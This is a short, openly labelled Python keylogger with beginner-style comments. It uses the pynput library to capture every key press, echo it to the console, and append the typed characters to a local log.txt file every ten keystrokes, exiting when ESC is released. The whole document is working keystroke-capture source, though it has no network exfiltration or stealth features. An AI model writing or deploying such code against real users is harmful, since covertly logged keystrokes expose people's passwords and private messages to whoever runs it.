                  #!!!!!!!!!!!!!!!! IT'S JUST SIMPLE KEYLOGGER!!!!!!!!!!!!!!!!!!
   #!!!!!!!!!!!!!!!!!! IT CAN BE DETECTED BY WINDOWS DEFENDER SO IT'S NOT HANDY !!!!!!!!!!!!!!!!!!





#Importing keyboard module from pynput
from pynput.keyboard import Key,Listener
#Creating a counter for each 10 letter we will print out a log.txt file.
count = 0

keys = []

def on_press(key):
    global count,keys
    count += 1
    #Printing when a key pressed.
    print("{0} pressed".format(key))
    #Appending that pressed key to our keys list for more readable word.
    keys.append(key)
    #After 10 key pressed we will write that keys and resign our count variable and keys list.
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    #It will write the letters we typed to a text file.
    with open("log.txt" , "a" , encoding="utf-8") as file:
        for key in keys:
                #Deleting each letters mark and replacing with blank.
            k = str(key).replace("'", "")
                #When space pressed we will go next line.
            if k.find("space") > 0:
                file.write("\n")
                #When some keys pressed like  (enter,space,f1,f2 etc..) we will replace that letter by itself.
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    #That will close program when ESC key release.
    if key == Key.esc:
        print("exit")
        return False

#It will contstantly running until we break out of it.
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

